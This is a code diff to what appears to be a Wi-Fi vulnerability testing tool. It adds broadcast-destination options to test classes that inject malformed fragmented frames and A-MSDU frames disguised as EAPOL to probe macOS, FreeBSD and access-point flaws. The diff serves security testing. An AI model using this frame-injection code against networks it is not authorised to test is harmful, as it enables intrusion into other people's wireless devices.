@@ -6,7 +6,8 @@ class PingTest(Test):
 		self.ptype = ptype
 		self.separate_with = separate_with
 
-		self.bcast = False if opt == None else opt.bcast
+		self.bcast_ra = False if opt == None else opt.bcast_ra
+		self.bcast_dst = False if opt == None else opt.bcast_dst
 		self.as_msdu = False if opt == None else opt.as_msdu
 		self.icmp_size = None if opt == None else opt.icmp_size
 		self.padding = None if opt == None else opt.padding
@@ -44,8 +45,13 @@ class PingTest(Test):
 
 		# Assign frames to the existing fragment objects
 		for frag, frame in zip(self.get_actions(Action.Inject), frames):
-			if self.bcast:
+			if self.bcast_ra:
 				frame.addr1 = "ff:ff:ff:ff:ff:ff"
+			if self.bcast_dst:
+				if header.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
+					frame.addr3 = "ff:ff:ff:ff:ff:ff"
+				else:
+					frame.addr1 = "ff:ff:ff:ff:ff:ff"
 
 			# Assign fragment numbers according to MetaDrop rules
 			frame.SC = (frame.SC & 0xfff0) | fragnums.pop(0)
@@ -127,9 +133,10 @@ class MacOsTest(Test):
 	"""
 	See docs/macoxs-reversing.md for background on the attack.
 	"""
-	def __init__(self, ptype, actions):
+	def __init__(self, ptype, actions, bcast_dst):
 		super().__init__(actions)
 		self.ptype = ptype
+		self.bcast_dst = bcast_dst
 
 	def prepare(self, station):
 		# First fragment is the start of an EAPOL frame
@@ -145,6 +152,12 @@ class MacOsTest(Test):
 		frag2, = create_fragments(header, data=request, num_frags=1)
 		frag2.SC |= 1
 		frag2.addr1 = "ff:ff:ff:ff:ff:ff"
+
+		# Practically all APs will not process frames with a broadcast receiver address, unless
+		# they are operating in client mode. But to test APs without tcpdump anyway, allow the
+		# ping to be send to a broadcast destination, so other STAs can monitor for it.
+		if self.bcast_dst and frag2.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
+			frag2.addr3 = "ff:ff:ff:ff:ff:ff"
 
 		self.actions[0].frame = frag1
 		self.actions[1].frame = frag2
@@ -175,10 +188,11 @@ class EapolTest(Test):
 
 
 class EapolAmsduTest(Test):
-	def __init__(self, ptype, actions, freebsd=False):
+	def __init__(self, ptype, actions, freebsd=False, opt=None):
 		super().__init__(actions)
 		self.ptype = ptype
 		self.freebsd = freebsd
+		self.bcast_dst = False if opt == None else opt.bcast_dst
 
 	def prepare(self, station):
 		log(STATUS, "Generating ping test", color="green")
@@ -190,14 +204,27 @@ class EapolAmsduTest(Test):
 		# Testing
 		#header.addr2 = "00:11:22:33:44:55"
 
+		mac_src = station.mac
+		mac_dst = station.get_peermac()
+		if self.bcast_dst:
+			mac_dst = "ff:ff:ff:ff:ff:ff"
+
 		# Masquerade A-MSDU frame as an EAPOL frame
 		if self.freebsd:
 			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
-			request = freebsd_create_eapolmsdu(station.mac, station.get_peermac(), request)
+			request = freebsd_create_eapolmsdu(mac_src, mac_dst, request)
 		else:
-			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(station.mac, station.get_peermac(), request)
+			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(mac_src, mac_dst, request)
 
 		frames = create_fragments(header, request, 1)
+		toinject = frames[0]
+
+		# Make sure addr1/3 matches the destination address in the A-MSDU subframe(s)
+		if self.bcast_dst:
+			if toinject.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
+				toinject.addr3 = "ff:ff:ff:ff:ff:ff"
+			else:
+				toinject.addr1 = "ff:ff:ff:ff:ff:ff"
 
 		# XXX Where was this needed again?
 		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
@@ -205,6 +232,6 @@ class EapolAmsduTest(Test):
 		auth.addr2 = "00:11:22:33:44:55"
 
 		self.actions[0].frame = auth
-		self.actions[1].frame = frames[0]
+		self.actions[1].frame = toinject
 
 
